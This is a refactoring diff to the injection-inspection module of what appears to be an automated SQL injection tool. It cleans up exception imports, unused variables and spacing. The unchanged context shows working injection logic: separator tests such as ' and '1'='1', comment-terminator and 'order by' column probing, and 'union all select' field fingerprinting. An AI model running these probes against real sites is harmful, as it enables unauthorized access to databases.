@@ -22,7 +22,9 @@
 # Gastón Traberg
 
 from dbmsmoles import DbmsMole
-from exceptions import *
+from moleexceptions import StoppedQueryException, ConnectionException
+from moleexceptions import SeparatorNotFound, CommentNotFound
+from moleexceptions import ColumnNumberNotFound, InjectableFieldNotFound
 
 class InjectionInspector:
 
@@ -42,13 +44,13 @@ class InjectionInspector:
                 mole.separator = sep
                 try:
                     req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1'.format(sep=sep))
-                except ConnectionException as ex:
+                except ConnectionException:
                     raise SeparatorNotFound()
                 if mole.analyser.is_valid(req):
                     # Validate the negation of the query
                     try:
                         req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0'.format(sep=sep))
-                    except ConnectionException as ex:
+                    except ConnectionException:
                         raise SeparatorNotFound()
                     if not mole.analyser.is_valid(req):
                         return (sep, parenthesis)
@@ -61,7 +63,7 @@ class InjectionInspector:
         if mole._dbms_mole is None:
             comment_list = ['#', '--', '/*', ' ']
         else:
-            comment_list  = mole._dbms_mole.comment_list
+            comment_list = mole._dbms_mole.comment_list
         mole.stop_query = False
         for parenthesis in range(0, 3):
             output_manager.info('Trying injection using {0} parenthesis.'.format(parenthesis))
@@ -73,7 +75,7 @@ class InjectionInspector:
                 mole.comment = com
                 try:
                     req = mole.make_request(' order by 1')
-                except ConnectionException as ex:
+                except ConnectionException:
                     raise CommentNotFound()
                 if mole.analyser.node_content(req) != mole._syntax_error_content and not DbmsMole.is_error(req):
                     return (com, parenthesis)
@@ -91,7 +93,6 @@ class InjectionInspector:
         content_of_needle = mole.analyser.node_content(req)
         mole.stop_query = False
         last = 2
-        done = False
         try:
             new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (last,)))
         except ConnectionException as ex:
@@ -129,7 +130,7 @@ class InjectionInspector:
             if mole.stop_query:
                 raise StoppedQueryException()
             output_manager.info('Trying finger {0}/{1}'.format(index + 1, len(fingers)))
-            index +=1
+            index += 1
             hashes = finger.build_query()
             to_search_hashes = finger.fingers_to_search()
             hash_string = ",".join(hashes)
@@ -137,7 +138,7 @@ class InjectionInspector:
                 req = mole.make_request(
                         " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
                     )
-            except ConnectionException as ex:
+            except ConnectionException:
                 return None
 
             injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
@@ -175,7 +176,7 @@ class InjectionInspector:
             query = dbms_mole_class.field_finger_query(mole.query_columns, finger, field)
             try:
                 req = mole.make_request(query)
-            except ConnectionException as ex:
+            except ConnectionException:
                 return None
             if dbms_mole_class.field_finger(finger) in req:
                 return field
